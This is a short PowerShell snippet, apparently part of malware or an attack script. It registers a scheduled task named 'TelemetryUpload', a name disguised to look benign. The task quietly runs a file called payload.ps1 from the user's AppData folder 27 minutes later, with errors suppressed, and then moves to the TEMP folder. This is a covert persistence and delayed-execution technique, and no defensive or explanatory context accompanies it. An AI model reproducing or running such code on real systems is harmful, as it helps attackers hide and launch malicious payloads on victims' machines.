
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\payload.ps1`""
$TaskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(27)
Register-ScheduledTask -TaskName "TelemetryUpload" -Action $TaskAction -Trigger $TaskTrigger -Force -ErrorAction SilentlyContinue
Set-Location -Path $env:TEMP
